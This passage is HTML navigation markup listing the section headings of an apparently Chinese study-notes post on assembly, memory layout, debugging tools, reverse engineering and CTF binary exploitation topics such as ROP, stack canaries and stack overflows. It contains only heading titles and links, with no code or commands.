class="nav-text">堆—向上增长</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B1%E4%BA%AB%E5%BA%93-Shared-Library-%E2%80%94-%E8%B5%B7%E5%A7%8B%E4%BA%8E-0x40000000"><span class="nav-number">1.3.2.1.4.</span> <span class="nav-text">共享库(Shared Library) — 起始于 0x40000000</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%88-Stack-%E2%80%94-esp-%E6%8C%87%E5%90%91%E6%A0%88%E9%A1%B6"><span class="nav-number">1.3.2.1.5.</span> <span class="nav-text">栈(Stack) — %esp 指向栈顶</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%A9%BA%E9%97%B4-Kernel-Space-%E2%80%94-0xC0000000-%E4%BB%A5%E4%B8%8A"><span class="nav-number">1.3.2.1.6.</span> <span class="nav-text">内核空间(Kernel Space) — 0xC0000000 以上</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E6%A0%88%E5%B8%A7"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">函数栈帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">虚拟内存</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9A-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">寄存器：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">寄存器的结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x86%E6%9E%B6%E6%9E%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%85%A8%E5%AE%B6%E7%A6%8F%EF%BC%88%E4%BB%A532%E4%BD%8D%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">x86架构寄存器全家福（以32位为例）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RIP%EF%BC%88EIP%EF%BC%89"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">RIP（EIP）:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RAX%EF%BC%88EAX%EF%BC%89%EF%BC%9A"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">RAX（EAX）：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RDI-RSI-RDX"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">RDI,RSI,RDX:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RSP-RBP%EF%BC%88%E6%A0%88%E7%9B%B8%E5%85%B3%EF%BC%89"><span class="nav-number">1.3.3.6.</span> <span class="nav-text">RSP, RBP（栈相关）:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9A"><span class="nav-number">1.3.3.7.</span> <span class="nav-text">段寄存器：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%87%E5%BF%97%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9A"><span class="nav-number">1.3.3.8.</span> <span class="nav-text">标志位寄存器：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B-%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4-%EF%BC%88done%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">四.基础的汇编指令 （done）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%88%86%E7%B1%BB"><span class="nav-number">1.4.1.</span> <span class="nav-text">汇编指令分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.4.2.</span> <span class="nav-text">常见指令详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E7%B1%BB"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">数据传输类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%B1%BB"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">算术运算类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E6%93%8D%E4%BD%9C"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">栈操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%B1%BB"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">逻辑运算类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E4%B8%8E%E6%AF%94%E8%BE%83"><span class="nav-number">1.4.2.5.</span> <span class="nav-text">控制流与比较</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%B1%BB"><span class="nav-number">1.4.2.6.</span> <span class="nav-text">函数调用类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90-%E8%AE%A1%E7%AE%97-1-2-%E2%80%A6-10"><span class="nav-number">1.4.2.7.</span> <span class="nav-text">例子:计算 1+2+…+10</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#intel%E8%AF%AD%E6%B3%95%E4%B8%8EAT-T%E8%AF%AD%E6%B3%95"><span class="nav-number">1.4.3.</span> <span class="nav-text">intel语法与AT&amp;T语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-%E4%BD%8D%E6%95%B0%E4%B8%8E%E5%AD%97%E8%8A%82"><span class="nav-number">1.5.</span> <span class="nav-text">五.数据类型&amp;位数与字节</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E5%8D%95%E4%BD%8D"><span class="nav-number">1.5.0.1.</span> <span class="nav-text">一、基本单位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%B8%B8%E8%A7%81%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%BD%8D%E6%95%B0%EF%BC%88C-%E8%AF%AD%E8%A8%80%EF%BC%8CLinux-x86-x64%EF%BC%89"><span class="nav-number">1.5.0.2.</span> <span class="nav-text">二、常见数据类型的位数（C 语言，Linux x86&#x2F;x64）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%8E%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="nav-number">1.5.0.3.</span> <span class="nav-text">三、二进制与十六进制</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%A8%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%EF%BC%9F"><span class="nav-number">1.5.0.3.1.</span> <span class="nav-text">为什么用十六进制？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AF%B9%E7%85%A7%E8%A1%A8"><span class="nav-number">1.5.0.3.2.</span> <span class="nav-text">对照表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">1.5.0.3.3.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%8D%E6%95%B0%E6%9C%AF%E8%AF%AD"><span class="nav-number">1.5.0.3.4.</span> <span class="nav-text">位数术语</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.5.0.4.</span> <span class="nav-text">四、字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E8%B4%A8%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%B1%E6%98%AF%E5%AD%97%E8%8A%82%E5%BA%8F%E5%88%97-%E7%BB%93%E6%9D%9F%E7%AC%A6"><span class="nav-number">1.5.0.4.1.</span> <span class="nav-text">本质：字符串就是字节序列 + 结束符</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AD%97%E8%8A%82%E5%BA%8F%EF%BC%88Endianness%EF%BC%89"><span class="nav-number">1.5.0.5.</span> <span class="nav-text">五、字节序（Endianness）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%A7%E7%AB%AF%E5%BA%8F%EF%BC%88Big-Endian%EF%BC%89"><span class="nav-number">1.5.0.5.1.</span> <span class="nav-text">大端序（Big Endian）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E7%AB%AF%E5%BA%8F%EF%BC%88Little-Endian%EF%BC%89"><span class="nav-number">1.5.0.5.2.</span> <span class="nav-text">小端序（Little Endian）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AD%98%E5%82%A8-0x12345678%EF%BC%884-%E5%AD%97%E8%8A%82%EF%BC%89"><span class="nav-number">1.5.0.5.3.</span> <span class="nav-text">存储 0x12345678（4 字节）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B0%8F%E4%BE%8B%E5%AD%90"><span class="nav-number">1.5.0.5.4.</span> <span class="nav-text">小例子</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%9C%89%E7%AC%A6%E5%8F%B7-vs-%E6%97%A0%E7%AC%A6%E5%8F%B7"><span class="nav-number">1.5.0.6.</span> <span class="nav-text">六、有符号 vs 无符号</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83-%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-number">1.6.</span> <span class="nav-text">七.栈的结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E7%AE%80%E4%BB%8B%EF%BC%9A%EF%BC%88%E9%80%89%E8%87%AActfwiki%EF%BC%89"><span class="nav-number">1.6.0.1.</span> <span class="nav-text">栈简介：（选自ctfwiki）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="nav-number">1.6.0.2.</span> <span class="nav-text">栈的作用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%88%E7%9A%84%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="nav-number">1.6.0.3.</span> <span class="nav-text">栈的结构：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB-demo%EF%BC%88%E6%BC%94%E7%A4%BA%EF%BC%89"><span class="nav-number">1.7.</span> <span class="nav-text">八.demo（演示）:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D-%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">1.8.</span> <span class="nav-text">九.工具的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ida"><span class="nav-number">1.8.1.</span> <span class="nav-text">ida</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#F5%E6%9F%A5%E7%9C%8B%E4%BC%AA%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">F5查看伪代码：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shift-f12%E6%9F%A5%E7%9C%8B%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">1.8.1.2.</span> <span class="nav-text">shift+f12查看字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x%E6%9F%A5%E7%9C%8B%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8"><span class="nav-number">1.8.1.3.</span> <span class="nav-text">x查看交叉引用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Y-%E9%94%AE%E4%BF%AE%E6%94%B9%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.8.1.4.</span> <span class="nav-text">Y 键修改变量类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AStart"><span class="nav-number">1.8.1.5.</span> <span class="nav-text">例题：Start</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb"><span class="nav-number">1.8.2.</span> <span class="nav-text">gdb</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb%E5%90%AF%E5%8A%A8-r"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">gdb启动 r</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gdb-b-%E8%AE%BE%E6%96%AD%E7%82%B9"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">gdb b 设断点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disas-main"><span class="nav-number">1.8.2.3.</span> <span class="nav-text">disas main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#set-rdi-0xdeadbeef"><span class="nav-number">1.8.2.4.</span> <span class="nav-text">set $rdi &#x3D; 0xdeadbeef</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E8%BF%87%E4%B8%8E%E6%AD%A5%E8%BF%9B"><span class="nav-number">1.8.2.5.</span> <span class="nav-text">步过与步进</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x"><span class="nav-number">1.8.2.6.</span> <span class="nav-text">x</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9AGNU-Debugge"><span class="nav-number">1.8.2.7.</span> <span class="nav-text">例题：GNU Debugge</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntool%E4%B8%8Epwn%E8%84%9A%E6%9C%AC"><span class="nav-number">1.8.3.</span> <span class="nav-text">pwntool与pwn脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pwntool%E6%89%93%E5%BC%80%E8%BD%AF%E4%BB%B6%EF%BC%9A"><span class="nav-number">1.8.3.1.</span> <span class="nav-text">pwntool打开软件：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%91%E9%80%81%E5%92%8C%E6%8E%A5%E6%94%B6%EF%BC%9A"><span class="nav-number">1.8.3.2.</span> <span class="nav-text">发送和接收：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0-payload%EF%BC%9A"><span class="nav-number">1.8.3.3.</span> <span class="nav-text">构造 payload：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF-%E5%88%86%E6%9E%90"><span class="nav-number">1.8.3.4.</span> <span class="nav-text">ELF 分析:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libc%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">1.8.3.5.</span> <span class="nav-text">libc分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP-%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-number">1.8.3.6.</span> <span class="nav-text">ROP 链分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81-shellcode-%E7%94%9F%E6%88%90"><span class="nav-number">1.8.3.7.</span> <span class="nav-text">动态 shellcode 生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E6%A3%80%E6%B5%8B"><span class="nav-number">1.8.3.8.</span> <span class="nav-text">保护机制检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E8%BE%85%E5%8A%A9"><span class="nav-number">1.8.3.9.</span> <span class="nav-text">调试辅助</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81-RE"><span class="nav-number">1.9.</span> <span class="nav-text">十.RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UPX%E5%A3%B3-done"><span class="nav-number">1.9.1.</span> <span class="nav-text">UPX壳(done?)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E5%A3%B3"><span class="nav-number">1.9.1.0.1.</span> <span class="nav-text">查壳</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E8%84%B1%E5%A3%B3"><span class="nav-number">1.9.1.0.2.</span> <span class="nav-text">工具脱壳</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3"><span class="nav-number">1.9.1.0.3.</span> <span class="nav-text">手动脱壳</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#esp%E5%AE%9A%E5%BE%8B%E6%B3%95"><span class="nav-number">1.9.1.0.3.1.</span> <span class="nav-text">esp定律法</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%AD%94%E6%94%B9upx"><span class="nav-number">1.9.1.0.4.</span> <span class="nav-text">魔改upx</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4"><span class="nav-number">1.9.2.</span> <span class="nav-text">花指令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8A%B1%E6%8C%87%E4%BB%A4%EF%BC%88Junk-Code%EF%BC%89"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">花指令（Junk Code）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E8%8A%B1%E6%8C%87%E4%BB%A4"><span class="nav-number">1.9.2.1.1.</span> <span class="nav-text">一、什么是花指令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E8%8A%B1%E6%8C%87%E4%BB%A4%E7%9A%84%E5%8E%9F%E7%90%86"><span class="nav-number">1.9.2.1.2.</span> <span class="nav-text">二、花指令的原理</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#2-1-%E5%8F%8D%E6%B1%87%E7%BC%96%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="nav-number">1.9.2.1.2.1.</span> <span class="nav-text">2.1 反汇编器的工作方式</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-2-%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%A6%82%E4%BD%95%E6%AC%BA%E9%AA%97%E5%8F%8D%E6%B1%87%E7%BC%96%E5%99%A8"><span class="nav-number">1.9.2.1.2.2.</span> <span class="nav-text">2.2 花指令如何欺骗反汇编器</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%B8%B8%E8%A7%81%E8%8A%B1%E6%8C%87%E4%BB%A4%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">三、常见花指令类型与示例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3-1-%E6%B0%B8%E7%9C%9F-%E6%B0%B8%E5%81%87%E8%B7%B3%E8%BD%AC-%E5%9E%83%E5%9C%BE%E5%AD%97%E8%8A%82%EF%BC%88%E6%9C%80%E7%BB%8F%E5%85%B8%EF%BC%81%EF%BC%89"><span class="nav-number">1.9.2.2.1.</span> <span class="nav-text">3.1 永真&#x2F;永假跳转 + 垃圾字节（最经典！）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-2-call-%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80"><span class="nav-number">1.9.2.2.2.</span> <span class="nav-text">3.2 call + 修改返回地址</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-3-%E5%A4%9A%E5%B1%82%E8%B7%B3%E8%BD%AC%EF%BC%88%E8%B7%B3%E8%BD%AC%E8%BF%B7%E5%AE%AB%EF%BC%89"><span class="nav-number">1.9.2.2.3.</span> <span class="nav-text">3.3 多层跳转（跳转迷宫）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-4-%E5%88%A9%E7%94%A8%E4%B8%8D%E9%80%8F%E6%98%8E%E8%B0%93%E8%AF%8D%EF%BC%88Opaque-Predicate%EF%BC%89"><span class="nav-number">1.9.2.2.4.</span> <span class="nav-text">3.4 利用不透明谓词（Opaque Predicate）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-5-%E5%88%A9%E7%94%A8-SEH%EF%BC%88%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%EF%BC%89"><span class="nav-number">1.9.2.2.5.</span> <span class="nav-text">3.5 利用 SEH（结构化异常处理）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-6-push-ret-%E4%BC%AA%E8%A3%85%E8%B7%B3%E8%BD%AC"><span class="nav-number">1.9.2.2.6.</span> <span class="nav-text">3.6 push + ret 伪装跳转</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-7-%E5%88%A9%E7%94%A8-rep-%E5%89%8D%E7%BC%80%E7%9A%84%E5%9E%83%E5%9C%BE"><span class="nav-number">1.9.2.2.7.</span> <span class="nav-text">3.7 利用 rep 前缀的垃圾</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-8-%E5%85%B1%E7%94%A8%E6%8C%87%E4%BB%A4%E5%AD%97%E8%8A%82%EF%BC%88%E6%8C%87%E4%BB%A4%E9%87%8D%E5%8F%A0%EF%BC%89"><span class="nav-number">1.9.2.2.8.</span> <span class="nav-text">3.8 共用指令字节（指令重叠）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E7%94%A8%E5%9E%83%E5%9C%BE%E5%AD%97%E8%8A%82%E9%80%89%E6%8B%A9"><span class="nav-number">1.9.2.3.</span> <span class="nav-text">四、常用垃圾字节选择</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80-PWN"><span class="nav-number">1.10.</span> <span class="nav-text">十一.PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system-bin-sh"><span class="nav-number">1.10.1.</span> <span class="nav-text">system(&#x2F;bin&#x2F;sh)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.10.1.1.</span> <span class="nav-text">system 是什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%A0%E5%85%A5-%E2%80%9C-bin-sh%E2%80%9D-%E6%97%B6%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88"><span class="nav-number">1.10.1.2.</span> <span class="nav-text">传入 “&#x2F;bin&#x2F;sh” 时会发生什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-system-%E5%BF%85%E9%A1%BB%E5%85%88-fork%EF%BC%8C%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5-execve"><span class="nav-number">1.10.1.3.</span> <span class="nav-text">为什么 system 必须先 fork，不能直接 execve</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#execve-%E7%9A%84%E2%80%9D%E8%87%AA%E6%9D%80%E5%BC%8F%E2%80%9D%E6%9C%AC%E8%B4%A8"><span class="nav-number">1.10.1.3.1.</span> <span class="nav-text">execve 的”自杀式”本质</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%8D-fork-%E7%9B%B4%E6%8E%A5-execve-%E4%BC%9A%E6%80%8E%E6%A0%B7"><span class="nav-number">1.10.1.3.2.</span> <span class="nav-text">如果不 fork 直接 execve 会怎样</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fork-%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88"><span class="nav-number">1.10.1.4.</span> <span class="nav-text">fork 解决了什么</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B"><span class="nav-number">1.10.1.5.</span> <span class="nav-text">完整流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">1.10.2.</span> <span class="nav-text">保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#NX%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.10.2.1.</span> <span class="nav-text">NX保护</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pie"><span class="nav-number">1.10.2.2.</span> <span class="nav-text">pie</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ASLR%E4%B8%8EPie%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.10.2.2.1.</span> <span class="nav-text">ASLR与Pie保护:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-number">1.10.2.2.2.</span> <span class="nav-text">绕过方式：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A"><span class="nav-number">1.10.2.2.3.</span> <span class="nav-text">例题：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#canary"><span class="nav-number">1.10.2.3.</span> <span class="nav-text">canary</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81canary%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.10.2.3.1.</span> <span class="nav-text">常见canary绕过方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A-1"><span class="nav-number">1.10.2.3.2.</span> <span class="nav-text">例子：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP"><span class="nav-number">1.10.3.</span> <span class="nav-text">ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rop"><span class="nav-number">1.10.3.1.</span> <span class="nav-text">rop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROP%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.10.3.2.</span> <span class="nav-text">ROP的原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Gadget"><span class="nav-number">1.10.3.3.</span> <span class="nav-text">Gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ROPgadget"><span class="nav-number">1.10.3.4.</span> <span class="nav-text">ROPgadget</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="nav-number">1.10.4.</span> <span class="nav-text">参数传递</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E8%A7%84%E5%88%99%EF%BC%9A"><span class="nav-number">1.10.4.1.</span> <span class="nav-text">核心规则：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.10.4.2.</span> <span class="nav-text">脚本示例：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">1.10.5.</span> <span class="nav-text">栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#test1"><span class="nav-number">1.10.5.1.</span> <span class="nav-text">test1:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E6%88%96%E8%80%85%E6%9E%84%E9%80%A0system-bin-sh"><span class="nav-number">1.10.5.1.1.</span> <span class="nav-text">找到或者构造system(&#x2F;bin&#x2F;sh)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 